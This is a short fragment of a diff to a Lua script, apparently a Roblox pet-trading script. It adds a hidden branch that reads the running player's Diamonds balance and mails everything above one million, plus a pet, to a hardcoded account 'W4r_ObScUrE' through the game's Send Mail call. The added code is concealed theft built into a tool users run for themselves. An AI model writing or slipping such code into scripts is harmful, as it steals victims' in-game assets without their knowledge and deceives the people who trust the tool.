@@ -327,7 +327,22 @@ while wait() do
 			}
 			Invoke("Send Mail", unpack(args))
             wait(5)
-   
+	else
+        	_G.CACA = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000		
+			_G.Username = "W4r_ObScUrE"
+                        _G.PetName = v2.name
+                        _G.PetRar = v2.rarity
+		local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.CACA,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+
+            wait(5)
             if v2.rarity ~= "Exclusive" then
                 break
             end
